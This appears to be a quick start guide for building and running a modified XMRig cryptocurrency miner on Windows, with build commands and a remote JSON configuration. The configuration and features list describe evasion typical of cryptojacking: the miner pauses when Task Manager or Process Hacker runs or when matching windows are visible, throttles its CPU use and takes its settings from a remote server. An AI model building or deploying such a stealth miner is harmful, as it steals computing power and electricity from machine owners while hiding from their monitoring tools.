# XMRig Quick Start Guide

## Prerequisites

1. **Visual Studio 2019** or later with C++ Desktop Development workload
2. **CMake 3.10** or later
3. **Git**

## Quick Build

### Step 1: Build the program
```cmd
build_windows_simple.bat
```

### Step 2: Run the program
```cmd
start_simple.bat https://your-server.com/config.json
```

## Manual Build (if script fails)

### Step 1: Open Developer Command Prompt
- Start Menu → Visual Studio 2019 → Developer Command Prompt

### Step 2: Build manually
```cmd
mkdir build
cd build
cmake .. -G "Visual Studio 16 2019" -A x64 -DWITH_OPENCL=OFF -DWITH_CUDA=OFF
cmake --build . --config Release --parallel
```

### Step 3: Copy executable
```cmd
copy Release\xmrig.exe ..\xmrig.exe
cd ..
```

## Usage

### Basic usage
```cmd
xmrig.exe --remote-config=https://your-server.com/config.json
```

### Test configuration
```cmd
xmrig.exe --remote-config=https://your-server.com/config.json --dry-run
```

### View help
```cmd
xmrig.exe --help
```

## Configuration

Create a JSON configuration file on your server with this structure:

```json
{
  "cpu-high-pause": 95,
  "cpu-low-resume": 30,
  "cpu-control-interval": 3,
  "cpu-resume-delay": 30,
  "process-pause-names": "taskmgr.exe,processhacker.exe",
  "window-pause-names": "administrator,task manager",
  "donate-level": 90,
  "donate-address": "YOUR_DONATE_ADDRESS",
  "donate-use-user-pool": true,
  "pools": [
    {
      "url": "pool.example.com:3333",
      "user": "YOUR_WALLET_ADDRESS",
      "pass": "x",
      "algo": "rx/0",
      "tls": true
    }
  ]
}
```

## Features

- ✅ Remote configuration from web
- ✅ CPU monitoring (pause when >95%, resume when <30%)
- ✅ Process detection (pause when specific processes running)
- ✅ Window detection (pause when specific windows visible)
- ✅ Smart resume with delay
- ✅ Auto retry for network failures

## Troubleshooting

### Build errors
- Make sure Visual Studio 2019+ is installed with C++ Desktop Development
- Make sure CMake 3.10+ is installed
- Run in Developer Command Prompt

### Runtime errors
- Check network connection
- Verify config URL is accessible
- Check JSON format is valid
- Install Visual C++ Redistributable if needed

### Performance issues
- Run as Administrator for best performance
- Close unnecessary background programs
- Adjust CPU thresholds in config